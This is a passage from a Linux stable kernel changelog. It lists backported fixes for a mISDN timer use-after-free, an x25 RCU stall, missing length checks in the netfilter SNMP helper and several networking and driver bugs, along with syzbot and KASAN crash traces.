\_\_wake\_up\_common\_lock+0xc7/0x190 kernel/sched/wait.c:120
\_\_wake\_up+0xe/0x10 kernel/sched/wait.c:145
dev\_expire\_timer+0xe4/0x3b0 drivers/isdn/mISDN/timerdev.c:174
call\_timer\_fn+0x190/0x720 kernel/time/timer.c:1325
protocol 88fb is buggy, dev hsr\_slave\_0
protocol 88fb is buggy, dev hsr\_slave\_1
expire\_timers kernel/time/timer.c:1362 [inline]
\_\_run\_timers kernel/time/timer.c:1681 [inline]
\_\_run\_timers kernel/time/timer.c:1649 [inline]
run\_timer\_softirq+0x652/0x1700 kernel/time/timer.c:1694
\_\_do\_softirq+0x266/0x95a kernel/softirq.c:292
invoke\_softirq kernel/softirq.c:373 [inline]
irq\_exit+0x180/0x1d0 kernel/softirq.c:413
exiting\_irq arch/x86/include/asm/apic.h:536 [inline]
smp\_apic\_timer\_interrupt+0x14a/0x570 arch/x86/kernel/apic/apic.c:1062
apic\_timer\_interrupt+0xf/0x20 arch/x86/entry/entry\_64.S:807

RIP: 0010:\_\_sanitizer\_cov\_trace\_pc+0x26/0x50 kernel/kcov.c:101
Code: 90 90 90 90 55 48 89 e5 48 8b 75 08 65 48 8b 04 25 40 ee 01 00 65 8b 15 98 12 92 7e 81 e2 00 01 1f 00 75 2b 8b 90 d8 12 00 00 <83> fa 02 75 20 48 8b 88 e0 12 00 00 8b 80 dc 12 00 00 48 8b 11 48
RSP: 0018:ffff8880589b7a60 EFLAGS: 00000246 ORIG\_RAX: ffffffffffffff13
RAX: ffff888087ce25c0 RBX: 0000000000000001 RCX: ffffffff818f8ca3
RDX: 0000000000000000 RSI: ffffffff818f8b48 RDI: 0000000000000001
RBP: ffff8880589b7a60 R08: ffff888087ce25c0 R09: ffffed1015d25bd0
R10: ffffed1015d25bcf R11: ffff8880ae92de7b R12: ffffea0001ae4680
R13: ffffea0001ae4688 R14: 0000000000000000 R15: ffffea0001b41648
PageIdle include/linux/page-flags.h:398 [inline]
page\_is\_idle include/linux/page\_idle.h:29 [inline]
mark\_page\_accessed+0x618/0x1140 mm/swap.c:398
touch\_buffer fs/buffer.c:59 [inline]
\_\_find\_get\_block+0x312/0xcc0 fs/buffer.c:1298
sb\_find\_get\_block include/linux/buffer\_head.h:338 [inline]
recently\_deleted fs/ext4/ialloc.c:682 [inline]
find\_inode\_bit.isra.0+0x202/0x510 fs/ext4/ialloc.c:722
\_\_ext4\_new\_inode+0x14ad/0x52c0 fs/ext4/ialloc.c:914
ext4\_symlink+0x3f8/0xbe0 fs/ext4/namei.c:3096
vfs\_symlink fs/namei.c:4126 [inline]
vfs\_symlink+0x378/0x5d0 fs/namei.c:4112
do\_symlinkat+0x22b/0x290 fs/namei.c:4153
\_\_do\_sys\_symlink fs/namei.c:4172 [inline]
\_\_se\_sys\_symlink fs/namei.c:4170 [inline]
\_\_x64\_sys\_symlink+0x59/0x80 fs/namei.c:4170
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x457b67
Code: 0f 1f 00 b8 5c 00 00 00 0f 05 48 3d 01 f0 ff ff 0f 83 6d bb fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 58 00 00 00 0f 05 <48> 3d 01 f0 ff ff 0f 83 4d bb fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007fff045ce0f8 EFLAGS: 00000202 ORIG\_RAX: 0000000000000058
RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 0000000000457b67
RDX: 00007fff045ce173 RSI: 00000000004bd63f RDI: 00007fff045ce160
RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000013
R10: 0000000000000075 R11: 0000000000000202 R12: 0000000000000000
R13: 0000000000000001 R14: 000000000000029b R15: 0000000000000001
Allocated by task 24763:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_kmalloc mm/kasan/common.c:496 [inline]
\_\_kasan\_kmalloc.constprop.0+0xcf/0xe0 mm/kasan/common.c:469
kasan\_kmalloc+0x9/0x10 mm/kasan/common.c:504
kmem\_cache\_alloc\_trace+0x151/0x760 mm/slab.c:3609
kmalloc include/linux/slab.h:545 [inline]
mISDN\_open+0x9a/0x270 drivers/isdn/mISDN/timerdev.c:59
misc\_open+0x398/0x4c0 drivers/char/misc.c:141
chrdev\_open+0x247/0x6b0 fs/char\_dev.c:417
do\_dentry\_open+0x47d/0x1130 fs/open.c:771
vfs\_open+0xa0/0xd0 fs/open.c:880
do\_last fs/namei.c:3418 [inline]
path\_openat+0x10d7/0x4690 fs/namei.c:3534
do\_filp\_open+0x1a1/0x280 fs/namei.c:3564
do\_sys\_open+0x3fe/0x5d0 fs/open.c:1063
\_\_do\_sys\_openat fs/open.c:1090 [inline]
\_\_se\_sys\_openat fs/open.c:1084 [inline]
\_\_x64\_sys\_openat+0x9d/0x100 fs/open.c:1084
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Freed by task 24762:
save\_stack+0x45/0xd0 mm/kasan/common.c:73
set\_track mm/kasan/common.c:85 [inline]
\_\_kasan\_slab\_free+0x102/0x150 mm/kasan/common.c:458
kasan\_slab\_free+0xe/0x10 mm/kasan/common.c:466
\_\_cache\_free mm/slab.c:3487 [inline]
kfree+0xcf/0x230 mm/slab.c:3806
mISDN\_close+0x2a1/0x390 drivers/isdn/mISDN/timerdev.c:97
\_\_fput+0x2df/0x8d0 fs/file\_table.c:278
\_\_\_\_fput+0x16/0x20 fs/file\_table.c:309
task\_work\_run+0x14a/0x1c0 kernel/task\_work.c:113
tracehook\_notify\_resume include/linux/tracehook.h:188 [inline]
exit\_to\_usermode\_loop+0x273/0x2c0 arch/x86/entry/common.c:166
prepare\_exit\_to\_usermode arch/x86/entry/common.c:197 [inline]
syscall\_return\_slowpath arch/x86/entry/common.c:268 [inline]
do\_syscall\_64+0x52d/0x610 arch/x86/entry/common.c:293
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
The buggy address belongs to the object at ffff88809fc18900
which belongs to the cache kmalloc-192 of size 192
The buggy address is located 72 bytes inside of
192-byte region [ffff88809fc18900, ffff88809fc189c0)
The buggy address belongs to the page:
page:ffffea00027f0600 count:1 mapcount:0 mapping:ffff88812c3f0040 index:0xffff88809fc18000
flags: 0x1fffc0000000200(slab)
raw: 01fffc0000000200 ffffea000269f648 ffffea00029f7408 ffff88812c3f0040
raw: ffff88809fc18000 ffff88809fc18000 000000010000000b 0000000000000000
page dumped because: kasan: bad access detected
Memory state around the buggy address:
ffff88809fc18800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
ffff88809fc18880: 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>ffff88809fc18900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
^
ffff88809fc18980: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
ffff88809fc18a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Signed-off-by: Eric Dumazet
Cc: Karsten Keil
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 74e1493e00f229a012fc87b536fa0ea9ce9b426a
Author: Eric Dumazet
Date: Fri Feb 8 12:41:05 2019 -0800
net/x25: do not hold the cpu too long in x25\_new\_lci()
commit cf657d22ee1f0e887326a92169f2e28dc932fd10 upstream.
Due to quadratic behavior of x25\_new\_lci(), syzbot was able
to trigger an rcu stall.
Fix this by not blocking BH for the whole duration of
the function, and inserting a reschedule point when possible.
If we care enough, using a bitmap could get rid of the quadratic
behavior.
syzbot report :
rcu: INFO: rcu\_preempt self-detected stall on CPU
rcu: 0-...!: (10500 ticks this GP) idle=4fa/1/0x4000000000000002 softirq=283376/283376 fqs=0
rcu: (t=10501 jiffies g=383105 q=136)
rcu: rcu\_preempt kthread starved for 10502 jiffies! g383105 f0x0 RCU\_GP\_WAIT\_FQS(5) ->state=0x402 ->cpu=0
rcu: RCU grace-period kthread stack dump:
rcu\_preempt I28928 10 2 0x80000000
Call Trace:
context\_switch kernel/sched/core.c:2844 [inline]
\_\_schedule+0x817/0x1cc0 kernel/sched/core.c:3485
schedule+0x92/0x180 kernel/sched/core.c:3529
schedule\_timeout+0x4db/0xfd0 kernel/time/timer.c:1803
rcu\_gp\_fqs\_loop kernel/rcu/tree.c:1948 [inline]
rcu\_gp\_kthread+0x956/0x17a0 kernel/rcu/tree.c:2105
kthread+0x357/0x430 kernel/kthread.c:246
ret\_from\_fork+0x3a/0x50 arch/x86/entry/entry\_64.S:352
NMI backtrace for cpu 0
CPU: 0 PID: 8759 Comm: syz-executor2 Not tainted 5.0.0-rc4+ #51
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:77 [inline]
dump\_stack+0x172/0x1f0 lib/dump\_stack.c:113
nmi\_cpu\_backtrace.cold+0x63/0xa4 lib/nmi\_backtrace.c:101
nmi\_trigger\_cpumask\_backtrace+0x1be/0x236 lib/nmi\_backtrace.c:62
arch\_trigger\_cpumask\_backtrace+0x14/0x20 arch/x86/kernel/apic/hw\_nmi.c:38
trigger\_single\_cpu\_backtrace include/linux/nmi.h:164 [inline]
rcu\_dump\_cpu\_stacks+0x183/0x1cf kernel/rcu/tree.c:1211
print\_cpu\_stall kernel/rcu/tree.c:1348 [inline]
check\_cpu\_stall kernel/rcu/tree.c:1422 [inline]
rcu\_pending kernel/rcu/tree.c:3018 [inline]
rcu\_check\_callbacks.cold+0x500/0xa4a kernel/rcu/tree.c:2521
update\_process\_times+0x32/0x80 kernel/time/timer.c:1635
tick\_sched\_handle+0xa2/0x190 kernel/time/tick-sched.c:161
tick\_sched\_timer+0x47/0x130 kernel/time/tick-sched.c:1271
\_\_run\_hrtimer kernel/time/hrtimer.c:1389 [inline]
\_\_hrtimer\_run\_queues+0x33e/0xde0 kernel/time/hrtimer.c:1451
hrtimer\_interrupt+0x314/0x770 kernel/time/hrtimer.c:1509
local\_apic\_timer\_interrupt arch/x86/kernel/apic/apic.c:1035 [inline]
smp\_apic\_timer\_interrupt+0x120/0x570 arch/x86/kernel/apic/apic.c:1060
apic\_timer\_interrupt+0xf/0x20 arch/x86/entry/entry\_64.S:807

RIP: 0010:\_\_read\_once\_size include/linux/compiler.h:193 [inline]
RIP: 0010:queued\_write\_lock\_slowpath+0x13e/0x290 kernel/locking/qrwlock.c:86
Code: 00 00 fc ff df 4c 8d 2c 01 41 83 c7 03 41 0f b6 45 00 41 38 c7 7c 08 84 c0 0f 85 0c 01 00 00 8b 03 3d 00 01 00 00 74 1a f3 90 <41> 0f b6 55 00 41 38 d7 7c eb 84 d2 74 e7 48 89 df e8 6c 0f 4f 00
RSP: 0018:ffff88805f117bd8 EFLAGS: 00000206 ORIG\_RAX: ffffffffffffff13
RAX: 0000000000000300 RBX: ffffffff89413ba0 RCX: 1ffffffff1282774
RDX: 0000000000000000 RSI: 0000000000000004 RDI: ffffffff89413ba0
RBP: ffff88805f117c70 R08: 1ffffffff1282774 R09: fffffbfff1282775
R10: fffffbfff1282774 R11: ffffffff89413ba3 R12: 00000000000000ff
R13: fffffbfff1282774 R14: 1ffff1100be22f7d R15: 0000000000000003
queued\_write\_lock include/asm-generic/qrwlock.h:104 [inline]
do\_raw\_write\_lock+0x1d6/0x290 kernel/locking/spinlock\_debug.c:203
\_\_raw\_write\_lock\_bh include/linux/rwlock\_api\_smp.h:204 [inline]
\_raw\_write\_lock\_bh+0x3b/0x50 kernel/locking/spinlock.c:312
x25\_insert\_socket+0x21/0xe0 net/x25/af\_x25.c:267
x25\_bind+0x273/0x340 net/x25/af\_x25.c:705
\_\_sys\_bind+0x23f/0x290 net/socket.c:1505
\_\_do\_sys\_bind net/socket.c:1516 [inline]
\_\_se\_sys\_bind net/socket.c:1514 [inline]
\_\_x64\_sys\_bind+0x73/0xb0 net/socket.c:1514
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x457e39
Code: ad b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 0f 83 7b b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007fafccd0dc78 EFLAGS: 00000246 ORIG\_RAX: 0000000000000031
RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 0000000000457e39
RDX: 0000000000000012 RSI: 0000000020000240 RDI: 0000000000000004
RBP: 000000000073bf00 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00007fafccd0e6d4
R13: 00000000004bdf8b R14: 00000000004ce4b8 R15: 00000000ffffffff
Sending NMI from CPU 0 to CPUs 1:
NMI backtrace for cpu 1
CPU: 1 PID: 8752 Comm: syz-executor4 Not tainted 5.0.0-rc4+ #51
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
RIP: 0010:\_\_x25\_find\_socket+0x78/0x120 net/x25/af\_x25.c:328
Code: 89 f8 48 c1 e8 03 80 3c 18 00 0f 85 a6 00 00 00 4d 8b 64 24 68 4d 85 e4 74 7f e8 03 97 3d fb 49 83 ec 68 74 74 e8 f8 96 3d fb <49> 8d bc 24 88 04 00 00 48 89 f8 48 c1 e8 03 0f b6 04 18 84 c0 74
RSP: 0018:ffff8880639efc58 EFLAGS: 00000246
RAX: 0000000000040000 RBX: dffffc0000000000 RCX: ffffc9000e677000
RDX: 0000000000040000 RSI: ffffffff863244b8 RDI: ffff88806a764628
RBP: ffff8880639efc80 R08: ffff8880a80d05c0 R09: fffffbfff1282775
R10: fffffbfff1282774 R11: ffffffff89413ba3 R12: ffff88806a7645c0
R13: 0000000000000001 R14: ffff88809f29ac00 R15: 0000000000000000
FS: 00007fe8d0c58700(0000) GS:ffff8880ae900000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000001b32823000 CR3: 00000000672eb000 CR4: 00000000001406e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
x25\_new\_lci net/x25/af\_x25.c:357 [inline]
x25\_connect+0x374/0xdf0 net/x25/af\_x25.c:786
\_\_sys\_connect+0x266/0x330 net/socket.c:1686
\_\_do\_sys\_connect net/socket.c:1697 [inline]
\_\_se\_sys\_connect net/socket.c:1694 [inline]
\_\_x64\_sys\_connect+0x73/0xb0 net/socket.c:1694
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x457e39
Code: ad b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 0f 83 7b b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007fe8d0c57c78 EFLAGS: 00000246 ORIG\_RAX: 000000000000002a
RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 0000000000457e39
RDX: 0000000000000012 RSI: 0000000020000200 RDI: 0000000000000004
RBP: 000000000073bf00 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00007fe8d0c586d4
R13: 00000000004be378 R14: 00000000004ceb00 R15: 00000000ffffffff
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Cc: Andrew Hendry
Cc: linux-x25@vger.kernel.org
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 6a3f7237871c4d5c090ab9a6fce3ba6a1baf1f82
Author: Jann Horn
Date: Wed Feb 6 22:56:15 2019 +0100
netfilter: nf\_nat\_snmp\_basic: add missing length checks in ASN.1 cbs
commit c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc upstream.
The generic ASN.1 decoder infrastructure doesn't guarantee that callbacks
will get as much data as they expect; callbacks have to check the `datalen`
parameter before looking at `data`. Make sure that snmp\_version() and
snmp\_helper() don't read/write beyond the end of the packet data.
(Also move the assignment to `pdata` down below the check to make it clear
that it isn't necessarily a pointer we can use before the `datalen` check.)
Fixes: cc2d58634e0f ("netfilter: nf\_nat\_snmp\_basic: use asn1 decoder library")
Signed-off-by: Jann Horn
Signed-off-by: Pablo Neira Ayuso
Signed-off-by: Greg Kroah-Hartman
commit a7e0b9680aecee238ab50c3781131c40df68a63b
Author: Scott Mayhew
Date: Fri Feb 15 13:42:02 2019 -0500
sunrpc: fix 4 more call sites that were using stack memory with a scatterlist
commit e7afe6c1d486b516ed586dcc10b3e7e3e85a9c2b upstream.
While trying to reproduce a reported kernel panic on arm64, I discovered
that AUTH\_GSS basically doesn't work at all with older enctypes on arm64
systems with CONFIG\_VMAP\_STACK enabled. It turns out there still a few
places using stack memory with scatterlists, causing krb5\_encrypt() and
krb5\_decrypt() to produce incorrect results (or a BUG if CONFIG\_DEBUG\_SG
is enabled).
Tested with cthon on v4.0/v4.1/v4.2 with krb5/krb5i/krb5p using
des3-cbc-sha1 and arcfour-hmac-md5.
Signed-off-by: Scott Mayhew
Cc: stable@vger.kernel.org
Signed-off-by: J. Bruce Fields
Signed-off-by: Greg Kroah-Hartman
commit bc5d97268c0c205cbecc3c10652991503938c9f8
Author: Logan Gunthorpe
Date: Thu Jan 17 08:46:34 2019 -0600
PCI: Fix \_\_initdata issue with "pci=disable\_acs\_redir" parameter
commit d2fd6e81912a665993b24dcdc1c1384a42a54f7e upstream.
The disable\_acs\_redir parameter stores a pointer to the string passed to
pci\_setup(). However, the string passed to PCI setup is actually a
temporary copy allocated in static \_\_initdata memory. After init, once the
memory is freed, it is no longer valid to reference this pointer.
This bug was noticed in v5.0-rc1 after a change in commit c5eb1190074c
("PCI / PM: Allow runtime PM without callback functions") caused
pci\_disable\_acs\_redir() to be called during shutdown which manifested
as an unable to handle kernel paging request at:
RIP: 0010:pci\_enable\_acs+0x3f/0x1e0
Call Trace:
pci\_restore\_state.part.44+0x159/0x3c0
pci\_restore\_standard\_config+0x33/0x40
pci\_pm\_runtime\_resume+0x2b/0xd0
? pci\_restore\_standard\_config+0x40/0x40
\_\_rpm\_callback+0xbc/0x1b0
rpm\_callback+0x1f/0x70
? pci\_restore\_standard\_config+0x40/0x40
rpm\_resume+0x4f9/0x710
? pci\_conf1\_read+0xb6/0xf0
? pci\_conf1\_write+0xb2/0xe0
\_\_pm\_runtime\_resume+0x47/0x70
pci\_device\_shutdown+0x1e/0x60
device\_shutdown+0x14a/0x1f0
kernel\_restart+0xe/0x50
\_\_do\_sys\_reboot+0x1ee/0x210
? \_\_fput+0x144/0x1d0
do\_writev+0x5e/0xf0
? do\_writev+0x5e/0xf0
do\_syscall\_64+0x48/0xf0
entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
It was also likely possible to trigger this bug when hotplugging PCI
devices.
To fix this, instead of storing a pointer, we use kstrdup() to copy the
disable\_acs\_redir\_param to its own buffer which will never be freed.
Fixes: aaca43fda742 ("PCI: Add "pci=disable\_acs\_redir=" parameter for peer-to-peer support")
Tested-by: Jarkko Nikula
Signed-off-by: Logan Gunthorpe
Signed-off-by: Bjorn Helgaas
Reviewed-by: Jarkko Nikula
Signed-off-by: Greg Kroah-Hartman
commit f9e6a18a44de0625a57e8b4fc2d10f0eb205047c
Author: Martin Blumenstingl
Date: Sat Feb 9 01:58:50 2019 +0100
mmc: meson-gx: fix interrupt name
commit 83e418a805d880a8b18add07f94d19b2a5a80307 upstream.
Commit bb364890323cca ("mmc: meson-gx: Free irq in release() callback")
changed the \_probe code to use request\_threaded\_irq() instead of
devm\_request\_threaded\_irq().
Unfortunately this removes a fallback for the interrupt name:
devm\_request\_threaded\_irq() uses the device name as fallback if the
given IRQ name is NULL. request\_threaded\_irq() has no such fallback,
thus /proc/interrupts shows "(null)" instead.
Explicitly pass the dev\_name() so we get the IRQ name shown in
/proc/interrupts again.
While here, also fix the indentation of the request\_threaded\_irq()
parameter list.
Fixes: bb364890323cca ("mmc: meson-gx: Free irq in release() callback")
Signed-off-by: Martin Blumenstingl
Signed-off-by: Ulf Hansson
Signed-off-by: Greg Kroah-Hartman
commit 88bfdab618dffd22db9b0cf29a913231bf67e1e3
Author: Wei Yongjun
Date: Mon Dec 17 12:19:53 2018 +0000
scsi: target/core: Use kmem\_cache\_free() instead of kfree()
commit 8b2db98e814a5ec45e8800fc22ca9000ae0a517b upstream.
memory allocated by kmem\_cache\_alloc() should be freed using
kmem\_cache\_free(), not kfree().
Fixes: ad669505c4e9 ("scsi: target/core: Make sure that target\_wait\_for\_sess\_cmds() waits long enough")
Signed-off-by: Wei Yongjun
Reviewed-by: Bart Van Assche
Signed-off-by: Martin K. Petersen
Signed-off-by: Greg Kroah-Hartman
commit 82f39f0219441075bdba1aa3e14b5d4b1fa0b481
Author: Wei Yongjun
Date: Wed Dec 26 11:28:24 2018 +0000
hwmon: (lm80) Fix missing unlock on error in set\_fan\_div()
commit 07bd14ccc3049f9c0147a91a4227a571f981601a upstream.
Add the missing unlock before return from function set\_fan\_div()
in the error handling case.
Fixes: c9c63915519b ("hwmon: (lm80) fix a missing check of the status of SMBus read")
Signed-off-by: Wei Yongjun
Signed-off-by: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
commit 718ccdb3ea31c7e4519fcbad37b2cce2585d4215
Author: Alexander Duyck
Date: Fri Feb 15 14:44:18 2019 -0800
net: Do not allocate page fragments that are not skb aligned
[ Upstream commit 3bed3cc4156eedf652b4df72bdb35d4f1a2a739d ]
This patch addresses the fact that there are drivers, specifically tun,
that will call into the network page fragment allocators with buffer sizes
that are not cache aligned. Doing this could result in data alignment
and DMA performance issues as these fragment pools are also shared with the
skb allocator and any other devices that will use napi\_alloc\_frags or
netdev\_alloc\_frags.
Fixes: ffde7328a36d ("net: Split netdev\_alloc\_frag into \_\_alloc\_page\_frag and add \_\_napi\_alloc\_frag")
Reported-by: Jann Horn
Signed-off-by: Alexander Duyck
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1bdb1675f33f321ad750c633792a6c0ad718a965
Author: Eric Dumazet
Date: Fri Feb 15 13:36:21 2019 -0800
tcp: tcp\_v4\_err() should be more careful
[ Upstream commit 2c4cc9712364c051b1de2d175d5fbea6be948ebf ]
ICMP handlers are not very often stressed, we should
make them more resilient to bugs that might surface in
the future.
If there is no packet in retransmit queue, we should
avoid a NULL deref.
Signed-off-by: Eric Dumazet
Reported-by: soukjin bae
Acked-by: Neal Cardwell
Acked-by: Soheil Hassas Yeganeh
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit df1b583c1654133825d4a9e5e7e048d0edb32bda
Author: Eric Dumazet
Date: Fri Feb 15 13:36:20 2019 -0800
tcp: clear icsk\_backoff in tcp\_write\_queue\_purge()
[ Upstream commit 04c03114be82194d4a4858d41dba8e286ad1787c ]
soukjin bae reported a crash in tcp\_v4\_err() handling
ICMP\_DEST\_UNREACH after tcp\_write\_queue\_head(sk)
returned a NULL pointer.
Current logic should have prevented this :
if (seq != tp->snd\_una || !icsk->icsk\_retransmits ||
!icsk->icsk\_backoff || fastopen)
break;
Problem is the write queue might have been purged
and icsk\_backoff has not been cleared.
Signed-off-by: Eric Dumazet
Reported-by: soukjin bae
Acked-by: Neal Cardwell
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 56e97e70f7e36a678ef1847a0b0e2d46caa7ac40
Author: David S. Miller
Date: Sat Feb 16 13:44:39 2019 -0800
net: Add header for usage of fls64()
[ Upstream commit 8681ef1f3d295bd3600315325f3b3396d76d02f6 ]
Fixes: 3b89ea9c5902 ("net: Fix for\_each\_netdev\_feature on Big endian")
Suggested-by: Eric Dumazet
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit a3b6fa373adc2194747152c77aeb68355417a399
Author: Eric Dumazet
Date: Thu Feb 7 12:27:38 2019 -0800
vxlan: test dev->flags & IFF\_UP before calling netif\_rx()
[ Upstream commit 4179cb5a4c924cd233eaadd081882425bc98f44e ]
netif\_rx() must be called under a strict contract.
At device dismantle phase, core networking clears IFF\_UP
and flush\_all\_backlogs() is called after rcu grace period
to make sure no incoming packet might be in a cpu backlog
and still referencing the device.
Most drivers call netif\_rx() from their interrupt handler,
and since the interrupts are disabled at device dismantle,
netif\_rx() does not have to check dev->flags & IFF\_UP
Virtual drivers do not have this guarantee, and must
therefore make the check themselves.
Otherwise we risk use-after-free and/or crashes.
Note this patch also fixes a small issue that came
with commit ce6502a8f957 ("vxlan: fix a use after free
in vxlan\_encap\_bypass"), since the dev->stats.rx\_dropped
change was done on the wrong device.
Fixes: d342894c5d2f ("vxlan: virtual extensible lan")
Fixes: ce6502a8f957 ("vxlan: fix a use after free in vxlan\_encap\_bypass")
Signed-off-by: Eric Dumazet
Cc: Petr Machata
Cc: Ido Schimmel
Cc: Roopa Prabhu
Cc: Stefano Brivio
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 03a6fc5712e8fcd598b7268002fce1af8aaea5be
Author: Paolo Abeni
Date: Thu Feb 7 14:13:18 2019 +0100
vsock: cope with memory allocation failure at socket creation time
[ Upstream commit 225d9464268599a5b4d094d02ec17808e44c7553 ]
In the unlikely event that the kmalloc call in vmci\_transport\_socket\_init()
fails, we end-up calling vmci\_transport\_destruct() with a NULL vmci\_trans()
and oopsing.
This change addresses the above explicitly checking for zero vmci\_trans()
at destruction time.
Reported-by: Xiumei Mu
Fixes: d021c344051a ("VSOCK: Introduce VM Sockets")
Signed-off-by: Paolo Abeni
Reviewed-by: Stefano Garzarella
Reviewed-by: Jorgen Hansen
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 9a752d37292bb377d3f7eb7755d78883fad5c439
Author: Jason Wang
Date: Tue Feb 19 14:53:44 2019 +0800
vhost: correctly check the return value of translate\_desc() in log\_used()
[ Upstream commit 816db7663565cd23f74ed3d5c9240522e3fb0dda ]
When fail, translate\_desc() returns negative value, otherwise the
number of iovs. So we should fail when the return value is negative
instead of a blindly check against zero.
Detected by CoverityScan, CID# 1442593: Control flow issues (DEADCODE)
Fixes: cc5e71075947 ("vhost: log dirty page correctly")
Acked-by: Michael S. Tsirkin
Reported-by: Stephen Hemminger
Signed-off-by: Jason Wang
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 1e3300eb2189d3657c7f222eb334838520113d8b
Author: Kai-Heng Feng
Date: Tue Feb 19 23:45:29 2019 +0800
sky2: Increase D3 delay again
[ Upstream commit 1765f5dcd00963e33f1b8a4e0f34061fbc0e2f7f ]
Another platform requires even longer delay to make the device work
correctly after S3.
So increase the delay to 300ms.
BugLink: https://bugs.launchpad.net/bugs/1798921
Signed-off-by: Kai-Heng Feng
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 6e04b8210f96f96a4dabfdaaca051a179c290003
Author: Alexandre Torgue
Date: Fri Feb 15 10:49:09 2019 +0100
net: stmmac: handle endianness in dwmac4\_get\_timestamp
[ Upstream commit 224babd62d6f19581757a6d8bae3bf9501fc10de ]
GMAC IP is little-endian and used on several kind of CPU (big or little
endian). Main callbacks functions of the stmmac drivers take care about
it. It was not the case for dwmac4\_get\_timestamp function.
Fixes: ba1ffd74df74 ("stmmac: fix PTP support for GMAC4")
Signed-off-by: Alexandre Torgue
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 176ab70112c5cd0bc865fcbe4f3bd4b3354e8f72
Author: Jose Abreu
Date: Mon Feb 18 14:35:03 2019 +0100
net: stmmac: Fix a race in EEE enable callback
[ Upstream commit 8a7493e58ad688eb23b81e45461c5d314f4402f1 ]
We are saving the status of EEE even before we try to enable it. This
leads to a race with XMIT function that tries to arm EEE timer before we
set it up.
Fix this by only saving the EEE parameters after all operations are
performed with success.
Signed-off-by: Jose Abreu
Fixes: d765955d2ae0 ("stmmac: add the Energy Efficient Ethernet support")
Cc: Joao Pinto
Cc: David S. Miller
Cc: Giuseppe Cavallaro
Cc: Alexandre Torgue
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 618bd2c202b4be4aac47fe520a7264bd041a2764
Author: Paul Kocialkowski
Date: Fri Feb 15 17:17:08 2019 +0100
net: phy: xgmiitorgmii: Support generic PHY status read
[ Upstream commit 197f9ab7f08ce4b9ece662f747c3991b2f0fbb57 ]
Some PHY drivers like the generic one do not provide a read\_status
callback on their own but rely on genphy\_read\_status being called
directly.
With the current code, this results in a NULL function pointer call.
Call genphy\_read\_status instead when there is no specific callback.
Fixes: f411a6160bd4 ("net: phy: Add gmiitorgmii converter support")
Signed-off-by: Paul Kocialkowski
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 1764111c99727258f6e947a12a3bcb376ceaf3ef
Author: Lorenzo Bianconi
Date: Wed Feb 6 19:18:04 2019 +0100
net: ipv4: use a dedicated counter for icmp\_v4 redirect packets
[ Upstream commit c09551c6ff7fe16a79a42133bcecba5fc2fc3291 ]
According to the algorithm described in the comment block at the
beginning of ip\_rt\_send\_redirect, the host should try to send
'ip\_rt\_redirect\_number' ICMP redirect packets with an exponential
backoff and then stop sending them at all assuming that the destination
ignores redirects.
If the device has previously sent some ICMP error packets that are
